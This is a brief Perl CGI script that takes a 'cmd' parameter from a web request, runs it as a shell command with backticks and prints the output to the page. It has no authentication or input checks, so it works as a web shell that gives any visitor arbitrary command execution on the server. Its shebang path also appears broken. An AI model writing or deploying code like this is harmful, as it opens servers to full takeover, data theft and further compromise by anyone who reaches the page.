#!/opt/lampp/xampp
use CGI':standard';
print"content-type:text/html\n\n";
print"<html><body bgcolor=aabbcc>
<h3>output for the entered command</h3>
</body>
</html>";
$cmd=param("cmd");
if($cmd)
{
@result=`$cmd`;
print"<br>";
foreach(@result)
{
print"$_<br>\t";
}
}
else
{
print"plz give cmd!!";
}
